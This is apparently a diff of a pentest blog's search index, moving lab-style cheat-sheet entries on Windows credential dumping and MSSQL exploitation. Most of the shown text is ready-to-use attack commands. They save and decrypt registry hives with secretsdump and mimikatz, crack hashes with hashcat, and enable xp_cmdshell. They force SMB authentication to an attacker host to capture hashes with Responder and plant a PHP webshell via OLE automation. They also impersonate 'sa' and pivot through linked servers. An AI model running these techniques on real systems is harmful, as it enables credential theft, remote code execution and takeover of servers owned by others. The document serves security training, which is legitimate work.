@@ -1049,45 +1049,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Extracting Passwords from Windows Registry.</title>
-    <url>/2025/11/25/Extracting-Passwords-from-Windows-Systems/</url>
-    <content><![CDATA[<h2 id="Dump-SAM-SYSTEM-And-SECURITY"><a href="#Dump-SAM-SYSTEM-And-SECURITY" class="headerlink" title="Dump SAM, SYSTEM, And SECURITY"></a>Dump SAM, SYSTEM, And SECURITY</h2><h3 id="Offline"><a href="#Offline" class="headerlink" title="Offline"></a>Offline</h3><h4 id="Copy-Registry"><a href="#Copy-Registry" class="headerlink" title="Copy Registry"></a>Copy Registry</h4><p>Key Registry Hives:</p>
-<ul>
-<li><p>HKLM\SAM - Contains local user password hashes</p>
-</li>
-<li><p>HKLM\SYSTEM - Contains boot key to decrypt SAM</p>
-</li>
-<li><p>HKLM\SECURITY - Contains cached domain credentials &amp; LSA secrets</p>
-</li>
-</ul>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\WINDOWS\system32&gt; reg.exe save hklm\sam C:\sam.save</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt; reg.exe save hklm\system C:\system.save</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt; reg.exe save hklm\security C:\security.save</span><br></pre></td></tr></table></figure>
-
-<h4 id="Secretsdump"><a href="#Secretsdump" class="headerlink" title="Secretsdump"></a>Secretsdump</h4><h5 id="Dump-hash"><a href="#Dump-hash" class="headerlink" title="Dump hash"></a>Dump hash</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL</span><br></pre></td></tr></table></figure>
-
-<h5 id="Crack-NT-hash"><a href="#Crack-NT-hash" class="headerlink" title="Crack NT hash"></a>Crack NT hash</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> hashcat -m 1000 hash.txt rockyou.txt</span><br></pre></td></tr></table></figure>
-
-<h5 id="Crack-DCC2-hashes"><a href="#Crack-DCC2-hashes" class="headerlink" title="Crack DCC2 hashes"></a>Crack DCC2 hashes</h5><p>➜ Local cache of a domain user’s password, used by Windows to allow login when the Domain Controller is unavailable.</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 2100 <span class="built_in">hash</span> rockyou.txt</span><br></pre></td></tr></table></figure>
-
-<p>➜ This type of hash cannot be used for lateral movement with techniques like Pass-the-Hash.</p>
-<h3 id="Remotely"><a href="#Remotely" class="headerlink" title="Remotely"></a>Remotely</h3><h5 id="netexec"><a href="#netexec" class="headerlink" title="netexec"></a>netexec</h5><p>With <code>local administrator privileges</code> we can dump lsa and sam over the network.</p>
-<p>➜ Dump lsa.</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa</span><br></pre></td></tr></table></figure>
-
-<p>➜ Dump sam.</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam</span><br></pre></td></tr></table></figure>
-<h3 id="Locally"><a href="#Locally" class="headerlink" title="Locally"></a>Locally</h3><h5 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># lsadump::sam</span></span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Post-Exploitation</category>
-        <category>Dump-Passwords</category>
-      </categories>
-      <tags>
-        <tag>Dump-SAM</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Hyper-V Administrators</title>
     <url>/2026/03/06/Hyper-V-Administrators/</url>
     <content><![CDATA[<blockquote>
@@ -1129,6 +1090,45 @@
         <category>Windows Privesc</category>
         <category>Groups</category>
       </categories>
+  </entry>
+  <entry>
+    <title>Extracting Passwords from Windows Registry.</title>
+    <url>/2025/11/25/Extracting-Passwords-from-Windows-Systems/</url>
+    <content><![CDATA[<h2 id="Dump-SAM-SYSTEM-And-SECURITY"><a href="#Dump-SAM-SYSTEM-And-SECURITY" class="headerlink" title="Dump SAM, SYSTEM, And SECURITY"></a>Dump SAM, SYSTEM, And SECURITY</h2><h3 id="Offline"><a href="#Offline" class="headerlink" title="Offline"></a>Offline</h3><h4 id="Copy-Registry"><a href="#Copy-Registry" class="headerlink" title="Copy Registry"></a>Copy Registry</h4><p>Key Registry Hives:</p>
+<ul>
+<li><p>HKLM\SAM - Contains local user password hashes</p>
+</li>
+<li><p>HKLM\SYSTEM - Contains boot key to decrypt SAM</p>
+</li>
+<li><p>HKLM\SECURITY - Contains cached domain credentials &amp; LSA secrets</p>
+</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\WINDOWS\system32&gt; reg.exe save hklm\sam C:\sam.save</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt; reg.exe save hklm\system C:\system.save</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt; reg.exe save hklm\security C:\security.save</span><br></pre></td></tr></table></figure>
+
+<h4 id="Secretsdump"><a href="#Secretsdump" class="headerlink" title="Secretsdump"></a>Secretsdump</h4><h5 id="Dump-hash"><a href="#Dump-hash" class="headerlink" title="Dump hash"></a>Dump hash</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL</span><br></pre></td></tr></table></figure>
+
+<h5 id="Crack-NT-hash"><a href="#Crack-NT-hash" class="headerlink" title="Crack NT hash"></a>Crack NT hash</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> hashcat -m 1000 hash.txt rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<h5 id="Crack-DCC2-hashes"><a href="#Crack-DCC2-hashes" class="headerlink" title="Crack DCC2 hashes"></a>Crack DCC2 hashes</h5><p>➜ Local cache of a domain user’s password, used by Windows to allow login when the Domain Controller is unavailable.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 2100 <span class="built_in">hash</span> rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p>➜ This type of hash cannot be used for lateral movement with techniques like Pass-the-Hash.</p>
+<h3 id="Remotely"><a href="#Remotely" class="headerlink" title="Remotely"></a>Remotely</h3><h5 id="netexec"><a href="#netexec" class="headerlink" title="netexec"></a>netexec</h5><p>With <code>local administrator privileges</code> we can dump lsa and sam over the network.</p>
+<p>➜ Dump lsa.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa</span><br></pre></td></tr></table></figure>
+
+<p>➜ Dump sam.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam</span><br></pre></td></tr></table></figure>
+<h3 id="Locally"><a href="#Locally" class="headerlink" title="Locally"></a>Locally</h3><h5 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># lsadump::sam</span></span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Dump-Passwords</category>
+      </categories>
+      <tags>
+        <tag>Dump-SAM</tag>
+      </tags>
   </entry>
   <entry>
     <title>Kerberoasting &amp; ASREPRoasting</title>
@@ -1379,81 +1379,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Mssql Exploitation</title>
-    <url>/2025/11/20/Mssql-Exploitation/</url>
-    <content><![CDATA[<h1 id="Execute-Commands"><a href="#Execute-Commands" class="headerlink" title="Execute Commands"></a>Execute Commands</h1><h4 id="Run-Commands"><a href="#Run-Commands" class="headerlink" title="Run Commands"></a>Run Commands</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">xp_cmdshell <span class="string">&#x27;whoami&#x27;</span>;</span></span><br><span class="line"></span><br><span class="line">output</span><br><span class="line">-----------------------------</span><br><span class="line">no service\mssql$sqlexpress</span><br><span class="line">NULL</span><br><span class="line">(2 rows affected)</span><br></pre></td></tr></table></figure>
-
-
-<p>➜ <code>xp_cmdshell</code> is disabled by default, so if we can’t run it, we can enable it if we have the required privileges.</p>
-<h4 id="Enable-XP-CMDSHELL"><a href="#Enable-XP-CMDSHELL" class="headerlink" title="Enable XP_CMDSHELL"></a>Enable XP_CMDSHELL</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- To allow advanced options to be changed.  </span><br><span class="line">mysql&gt; EXECUTE sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line"></span><br><span class="line">-- To update the currently configured value for advanced options.  </span><br><span class="line">mysql&gt; RECONFIGURE;</span><br><span class="line"></span><br><span class="line">-- To enable the feature.  </span><br><span class="line">mysql&gt; EXECUTE sp_configure &#x27;xp_cmdshell&#x27;, 1;</span><br><span class="line"></span><br><span class="line">-- To update the currently configured value for this feature.  </span><br><span class="line">mysql&gt; RECONFIGURE;</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Capture-MSSQL-Service-Hash"><a href="#Capture-MSSQL-Service-Hash" class="headerlink" title="Capture MSSQL Service Hash"></a>Capture MSSQL Service Hash</h1><h2 id="Force-Remote-SMB-Authentication"><a href="#Force-Remote-SMB-Authentication" class="headerlink" title="Force Remote SMB Authentication"></a>Force Remote SMB Authentication</h2><h4 id="XP-DIRTREE"><a href="#XP-DIRTREE" class="headerlink" title="XP_DIRTREE"></a>XP_DIRTREE</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&gt; EXEC master..xp_dirtree &#x27;\\10.10.110.17\share\&#x27;</span><br><span class="line">2&gt; GO</span><br><span class="line"></span><br><span class="line">subdirectory    depth</span><br><span class="line">--------------- -----------</span><br></pre></td></tr></table></figure>
-
-<h4 id="XP-SUBDIRS-Hash"><a href="#XP-SUBDIRS-Hash" class="headerlink" title="XP_SUBDIRS Hash"></a>XP_SUBDIRS Hash</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&gt; EXEC master..xp_subdirs &#x27;\\10.10.110.17\share\&#x27;</span><br><span class="line">2&gt; GO</span><br><span class="line"></span><br><span class="line">HResult 0x55F6, Level 16, State 1</span><br><span class="line">xp_subdirs could not access &#x27;\\10.10.110.17\share\*.*&#x27;: FindFirstFile() returned error 5, &#x27;Access is denied.&#x27;</span><br></pre></td></tr></table></figure>
-
-
-<h4 id="sys-dm-os-file-exists"><a href="#sys-dm-os-file-exists" class="headerlink" title="sys.dm_os_file_exists"></a>sys.dm_os_file_exists</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM sys.dm_os_file_exists(&#x27;\\servername\appfolder\filename.txt&#x27;);</span><br></pre></td></tr></table></figure>
-
-
-<p>➜ For more methods : <a href="https://github.com/NetSPI/PowerUpSQL/wiki/SQL-Server---UNC-Path-Injection-Cheat-Sheet">cheat sheet</a></p>
-<h2 id="Run-Responder-Or-impacket-smbserver-And-Capture-Hash"><a href="#Run-Responder-Or-impacket-smbserver-And-Capture-Hash" class="headerlink" title="Run Responder Or impacket-smbserver And Capture Hash"></a>Run Responder Or impacket-smbserver And Capture Hash</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> responder -I tun0</span><br><span class="line"></span><br><span class="line">[SMB] NTLMv2-SSP Client   : 10.10.110.17</span><br><span class="line">[SMB] NTLMv2-SSP Username : SRVMSSQL\demouser</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:5e3ab:B7E2425C4A7107:&lt;snip&gt; 069006E006700730061000000000000000000</span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> impacket-smbserver share ./ -smb2support</span><br><span class="line"></span><br><span class="line">demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:&lt;snip&gt; 069006E006700730061000000000000000000</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Read-Local-Files"><a href="#Read-Local-Files" class="headerlink" title="Read Local Files"></a>Read Local Files</h1><p>➜ By default, MSSQL allows reading any file on the operating system that the SQL Server account has permission to access.</p>
-<h4 id="sqlcmd"><a href="#sqlcmd" class="headerlink" title="sqlcmd"></a>sqlcmd</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> OPENROWSET(BULK N<span class="string">&#x27;C:/Windows/System32/drivers/etc/hosts&#x27;</span>, SINGLE_CLOB) <span class="keyword">AS</span> Contents</span><br><span class="line"><span class="number">2</span><span class="operator">&gt;</span> GO</span><br><span class="line"></span><br><span class="line">BulkColumn</span><br><span class="line"></span><br><span class="line"><span class="comment">-----------------------------------------------------------------------------</span></span><br><span class="line"># Copyright (c) <span class="number">1993</span><span class="number">-2009</span> Microsoft Corp.</span><br><span class="line">#</span><br><span class="line"># This <span class="keyword">is</span> a sample HOSTS file used <span class="keyword">by</span> Microsoft TCP<span class="operator">/</span>IP <span class="keyword">for</span> Windows.</span><br><span class="line">#</span><br><span class="line"># This file <span class="keyword">contains</span> the mappings <span class="keyword">of</span> IP addresses <span class="keyword">to</span> hostnames. <span class="keyword">Each</span></span><br><span class="line"># entry should be kept <span class="keyword">on</span> an individual line. The IP address should</span><br><span class="line"></span><br><span class="line">(<span class="number">1</span> <span class="keyword">rows</span> affected)</span><br></pre></td></tr></table></figure>
-
-
-<h4 id="Mssqlclient"><a href="#Mssqlclient" class="headerlink" title="Mssqlclient"></a>Mssqlclient</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> OPENROWSET(BULK N<span class="string">&#x27;C:\Users\damundsen\Desktop\flag.txt&#x27;</span>, SINGLE_CLOB) <span class="keyword">AS</span> Contents</span><br><span class="line"></span><br><span class="line">BulkColumn</span><br><span class="line"></span><br><span class="line"><span class="comment">-----------------------------------------------------------------------------</span></span><br><span class="line"># Copyright (c) <span class="number">1993</span><span class="number">-2009</span> Microsoft Corp.</span><br><span class="line">#</span><br><span class="line"># This <span class="keyword">is</span> a sample HOSTS file used <span class="keyword">by</span> Microsoft TCP<span class="operator">/</span>IP <span class="keyword">for</span> Windows.</span><br><span class="line">#</span><br><span class="line"># This file <span class="keyword">contains</span> the mappings <span class="keyword">of</span> IP addresses <span class="keyword">to</span> hostnames. <span class="keyword">Each</span></span><br><span class="line"># entry should be kept <span class="keyword">on</span> an individual line. The IP address should</span><br><span class="line"></span><br><span class="line">(<span class="number">1</span> <span class="keyword">rows</span> affected)</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Write-Files-On-The-Server"><a href="#Write-Files-On-The-Server" class="headerlink" title="Write Files On The Server"></a>Write Files On The Server</h1><p>➜ To write files using <code>MSSQL</code>, we need to enable <a href="https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option">Ole Automation Procedures</a>, which requires admin privileges</p>
-<h2 id="sqlcmd-1"><a href="#sqlcmd-1" class="headerlink" title="sqlcmd"></a>sqlcmd</h2><h4 id="Enable-Ole-Automation-Procedures"><a href="#Enable-Ole-Automation-Procedures" class="headerlink" title="Enable Ole Automation Procedures"></a>Enable Ole Automation Procedures</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">&gt;</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span></span><br><span class="line"><span class="number">2</span><span class="operator">&gt;</span> GO</span><br><span class="line"><span class="number">3</span><span class="operator">&gt;</span> RECONFIGURE</span><br><span class="line"><span class="number">4</span><span class="operator">&gt;</span> GO</span><br><span class="line"><span class="number">5</span><span class="operator">&gt;</span> sp_configure <span class="string">&#x27;Ole Automation Procedures&#x27;</span>, <span class="number">1</span></span><br><span class="line"><span class="number">6</span><span class="operator">&gt;</span> GO</span><br><span class="line"><span class="number">7</span><span class="operator">&gt;</span> RECONFIGURE</span><br><span class="line"><span class="number">8</span><span class="operator">&gt;</span> GO</span><br></pre></td></tr></table></figure>
-
-<h4 id="Write-Files"><a href="#Write-Files" class="headerlink" title="Write Files"></a>Write Files</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&gt; DECLARE @OLE INT</span><br><span class="line">2&gt; DECLARE @FileID INT</span><br><span class="line">3&gt; EXECUTE sp_OACreate &#x27;Scripting.FileSystemObject&#x27;, @OLE OUT</span><br><span class="line">4&gt; EXECUTE sp_OAMethod @OLE, &#x27;OpenTextFile&#x27;, @FileID OUT, &#x27;c:\inetpub\wwwroot\webshell.php&#x27;, 8, 1</span><br><span class="line">5&gt; EXECUTE sp_OAMethod @FileID, &#x27;WriteLine&#x27;, Null, &#x27;&lt;?php echo shell_exec($_GET[&quot;c&quot;]);?&gt;&#x27;</span><br><span class="line">6&gt; EXECUTE sp_OADestroy @FileID</span><br><span class="line">7&gt; EXECUTE sp_OADestroy @OLE</span><br><span class="line">8&gt; GO</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Impersonate-Existing-Users"><a href="#Impersonate-Existing-Users" class="headerlink" title="Impersonate Existing Users"></a>Impersonate Existing Users</h1><p>➜ First, we need to identify which users we are allowed to impersonate. Sysadmins can impersonate any account by default, whereas non-administrative users require explicit permission to do so.</p>
-<h4 id="Verifying-our-Current-User-and-Role"><a href="#Verifying-our-Current-User-and-Role" class="headerlink" title="Verifying our Current User and Role"></a>Verifying our Current User and Role</h4><p>Let’s verify if our current user has the sysadmin role:</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="built_in">SYSTEM_USER</span></span><br><span class="line"><span class="number">2</span><span class="operator">&gt;</span> <span class="keyword">SELECT</span> IS_SRVROLEMEMBER(<span class="string">&#x27;sysadmin&#x27;</span>)</span><br><span class="line"><span class="number">3</span><span class="operator">&gt;</span> go</span><br><span class="line"></span><br><span class="line"><span class="comment">-----------</span></span><br><span class="line">julio                                                                                                                    </span><br><span class="line"></span><br><span class="line">(<span class="number">1</span> <span class="keyword">rows</span> affected)</span><br><span class="line"></span><br><span class="line"><span class="comment">-----------</span></span><br><span class="line">          <span class="number">0</span></span><br><span class="line"></span><br><span class="line">(<span class="number">1</span> <span class="keyword">rows</span> affected)</span><br></pre></td></tr></table></figure>
-
-<p>As the returned value <code>0</code> indicates, we do not have the sysadmin role</p>
-<h4 id="Identify-Users-that-We-Can-Impersonate"><a href="#Identify-Users-that-We-Can-Impersonate" class="headerlink" title="Identify Users that We Can Impersonate"></a>Identify Users that We Can Impersonate</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="keyword">distinct</span> b.name</span><br><span class="line"><span class="number">2</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> sys.server_permissions a</span><br><span class="line"><span class="number">3</span><span class="operator">&gt;</span> <span class="keyword">INNER</span> <span class="keyword">JOIN</span> sys.server_principals b</span><br><span class="line"><span class="number">4</span><span class="operator">&gt;</span> <span class="keyword">ON</span> a.grantor_principal_id <span class="operator">=</span> b.principal_id</span><br><span class="line"><span class="number">5</span><span class="operator">&gt;</span> <span class="keyword">WHERE</span> a.permission_name <span class="operator">=</span> <span class="string">&#x27;IMPERSONATE&#x27;</span></span><br><span class="line"><span class="number">6</span><span class="operator">&gt;</span> GO</span><br><span class="line"></span><br><span class="line">name</span><br><span class="line"><span class="comment">-----------------------------------------------</span></span><br><span class="line">sa</span><br><span class="line">ben</span><br><span class="line">valentin</span><br><span class="line"></span><br><span class="line">(<span class="number">3</span> <span class="keyword">rows</span> affected)</span><br></pre></td></tr></table></figure>
-
-<p>We can impersonate the <code>sa</code> user. Let us impersonate the user and try to execute the some commands.</p>
-<h4 id="Impersonating-the-SA-User"><a href="#Impersonating-the-SA-User" class="headerlink" title="Impersonating the SA User"></a>Impersonating the SA User</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">&gt;</span> <span class="keyword">EXECUTE</span> <span class="keyword">AS</span> LOGIN <span class="operator">=</span> <span class="string">&#x27;sa&#x27;</span></span><br><span class="line"><span class="number">2</span><span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="built_in">SYSTEM_USER</span></span><br><span class="line"><span class="number">3</span><span class="operator">&gt;</span> <span class="keyword">SELECT</span> IS_SRVROLEMEMBER(<span class="string">&#x27;sysadmin&#x27;</span>)</span><br><span class="line"><span class="number">4</span><span class="operator">&gt;</span> GO</span><br><span class="line"></span><br><span class="line"><span class="comment">-----------</span></span><br><span class="line">sa</span><br><span class="line"></span><br><span class="line">(<span class="number">1</span> <span class="keyword">rows</span> affected)</span><br><span class="line"></span><br><span class="line"><span class="comment">-----------</span></span><br><span class="line">          <span class="number">1</span></span><br><span class="line"></span><br><span class="line">(<span class="number">1</span> <span class="keyword">rows</span> affected)</span><br></pre></td></tr></table></figure>
-
-<p><strong>Note:</strong> It’s recommended to run <code>EXECUTE AS LOGIN</code> within the master DB, because all users, by default, have access to that database.</p>
-<h1 id="Linked-Servers"><a href="#Linked-Servers" class="headerlink" title="Linked Servers"></a>Linked Servers</h1><p><code>MSSQL</code> linked servers let one SQL Server query another server or database.</p>
-<h4 id="Identify-Linked-Servers-In-MSSQL"><a href="#Identify-Linked-Servers-In-MSSQL" class="headerlink" title="Identify Linked Servers In MSSQL"></a>Identify Linked Servers In MSSQL</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">&gt;</span> <span class="keyword">SELECT</span> srvname, isremote <span class="keyword">FROM</span> sysservers</span><br><span class="line"><span class="number">2</span><span class="operator">&gt;</span> GO</span><br><span class="line"></span><br><span class="line">srvname                             isremote</span><br><span class="line"><span class="comment">----------------------------------- --------</span></span><br><span class="line">DESKTOP<span class="operator">-</span>MFERMN4\SQLEXPRESS          <span class="number">1</span></span><br><span class="line"><span class="number">10.0</span><span class="number">.0</span><span class="number">.12</span>\SQLEXPRESS                <span class="number">0</span></span><br><span class="line"></span><br><span class="line">(<span class="number">2</span> <span class="keyword">rows</span> affected)</span><br></pre></td></tr></table></figure>
-
-<p>As shown in the query output, we have the server name and the <code>isremote</code> column, where <code>1</code> indicates a remote server and <code>0</code> indicates a linked server.</p>
-<h4 id="Identify-The-User-Used-For-The-Connection"><a href="#Identify-The-User-Used-For-The-Connection" class="headerlink" title="Identify The User Used For The Connection"></a>Identify The User Used For The Connection</h4><p>We can find the linked server’s user and privileges using <code>EXECUTE</code>, to run commands on the remote server we need to specify it in <code>[ ]</code>.</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">&gt;</span> <span class="keyword">EXECUTE</span>(<span class="string">&#x27;select @@servername, @@version, system_user, is_srvrolemember(&#x27;&#x27;sysadmin&#x27;&#x27;)&#x27;</span>) <span class="keyword">AT</span> [<span class="number">10.0</span><span class="number">.0</span><span class="number">.12</span>\SQLEXPRESS]</span><br><span class="line"><span class="number">2</span><span class="operator">&gt;</span> GO</span><br><span class="line"></span><br><span class="line"><span class="comment">------------------------------ ------------------------------ ------------------------------ -----------</span></span><br><span class="line">DESKTOP<span class="number">-0</span>L9D4KA\SQLEXPRESS     Microsoft <span class="keyword">SQL</span> Server <span class="number">2019</span> (RTM sa_remote                                <span class="number">1</span></span><br><span class="line"></span><br><span class="line">(<span class="number">1</span> <span class="keyword">rows</span> affected)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>is_srvrolemember(&#39;sysadmin&#39;)</code> returning <code>1</code> confirms that the user <code>sa_remote </code> has <strong>sysadmin privileges</strong>.</li>
-</ul>
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Service-Exploitation</category>
-        <category>MSSQL</category>
-      </categories>
-      <tags>
-        <tag>MSSQL</tag>
-        <tag>MSSQL-Execute-Commands</tag>
-        <tag>MSSQL-Read-Files</tag>
-        <tag>MSSQL-Write-Files</tag>
-        <tag>MSSQL-Linked-Server</tag>
-        <tag>MSSQL-Impersonate-User</tag>
-        <tag>Capture-MSSQL-Service-Hash</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Mssql Enumeration</title>
     <url>/2025/11/20/Mssql-Enumeration/</url>
     <content><![CDATA[<h1 id="Connect-To-The-Data-Base"><a href="#Connect-To-The-Data-Base" class="headerlink" title="Connect To The Data Base"></a>Connect To The Data Base</h1><h2 id="SQL-Authentication"><a href="#SQL-Authentication" class="headerlink" title="SQL Authentication"></a>SQL Authentication</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><h5 id="sqlcmd"><a href="#sqlcmd" class="headerlink" title="sqlcmd"></a>sqlcmd</h5><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">sqlcmd -S target -U username -P &#x27;password&#x27; -y <span class="number">30</span> -Y <span class="number">30</span></span><br></pre></td></tr></table></figure>
@@ -1550,43 +1475,78 @@
       </tags>
   </entry>
   <entry>
-    <title>MySQL Exploitation</title>
-    <url>/2025/11/21/MySQL-Exploitation/</url>
-    <content><![CDATA[<h1 id="Secure-File-Privileges"><a href="#Secure-File-Privileges" class="headerlink" title="Secure File Privileges"></a>Secure File Privileges</h1><p><code>secure_file_priv</code> in <strong>MySQL</strong> controls where you can read&#x2F;write files.</p>
+    <title>Mssql Exploitation</title>
+    <url>/2025/11/20/Mssql-Exploitation/</url>
+    <content><![CDATA[<h1 id="Execute-Commands"><a href="#Execute-Commands" class="headerlink" title="Execute Commands"></a>Execute Commands</h1><h4 id="Run-Commands"><a href="#Run-Commands" class="headerlink" title="Run Commands"></a>Run Commands</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">xp_cmdshell <span class="string">&#x27;whoami&#x27;</span>;</span></span><br><span class="line"></span><br><span class="line">output</span><br><span class="line">-----------------------------</span><br><span class="line">no service\mssql$sqlexpress</span><br><span class="line">NULL</span><br><span class="line">(2 rows affected)</span><br></pre></td></tr></table></figure>
+
+
+<p>➜ <code>xp_cmdshell</code> is disabled by default, so if we can’t run it, we can enable it if we have the required privileges.</p>
+<h4 id="Enable-XP-CMDSHELL"><a href="#Enable-XP-CMDSHELL" class="headerlink" title="Enable XP_CMDSHELL"></a>Enable XP_CMDSHELL</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- To allow advanced options to be changed.  </span><br><span class="line">mysql&gt; EXECUTE sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line"></span><br><span class="line">-- To update the currently configured value for advanced options.  </span><br><span class="line">mysql&gt; RECONFIGURE;</span><br><span class="line"></span><br><span class="line">-- To enable the feature.  </span><br><span class="line">mysql&gt; EXECUTE sp_configure &#x27;xp_cmdshell&#x27;, 1;</span><br><span class="line"></span><br><span class="line">-- To update the currently configured value for this feature.  </span><br><span class="line">mysql&gt; RECONFIGURE;</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Capture-MSSQL-Service-Hash"><a href="#Capture-MSSQL-Service-Hash" class="headerlink" title="Capture MSSQL Service Hash"></a>Capture MSSQL Service Hash</h1><h2 id="Force-Remote-SMB-Authentication"><a href="#Force-Remote-SMB-Authentication" class="headerlink" title="Force Remote SMB Authentication"></a>Force Remote SMB Authentication</h2><h4 id="XP-DIRTREE"><a href="#XP-DIRTREE" class="headerlink" title="XP_DIRTREE"></a>XP_DIRTREE</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&gt; EXEC master..xp_dirtree &#x27;\\10.10.110.17\share\&#x27;</span><br><span class="line">2&gt; GO</span><br><span class="line"></span><br><span class="line">subdirectory    depth</span><br><span class="line">--------------- -----------</span><br></pre></td></tr></table></figure>
+
+<h4 id="XP-SUBDIRS-Hash"><a href="#XP-SUBDIRS-Hash" class="headerlink" title="XP_SUBDIRS Hash"></a>XP_SUBDIRS Hash</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&gt; EXEC master..xp_subdirs &#x27;\\10.10.110.17\share\&#x27;</span><br><span class="line">2&gt; GO</span><br><span class="line"></span><br><span class="line">HResult 0x55F6, Level 16, State 1</span><br><span class="line">xp_subdirs could not access &#x27;\\10.10.110.17\share\*.*&#x27;: FindFirstFile() returned error 5, &#x27;Access is denied.&#x27;</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="sys-dm-os-file-exists"><a href="#sys-dm-os-file-exists" class="headerlink" title="sys.dm_os_file_exists"></a>sys.dm_os_file_exists</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM sys.dm_os_file_exists(&#x27;\\servername\appfolder\filename.txt&#x27;);</span><br></pre></td></tr></table></figure>
+
+
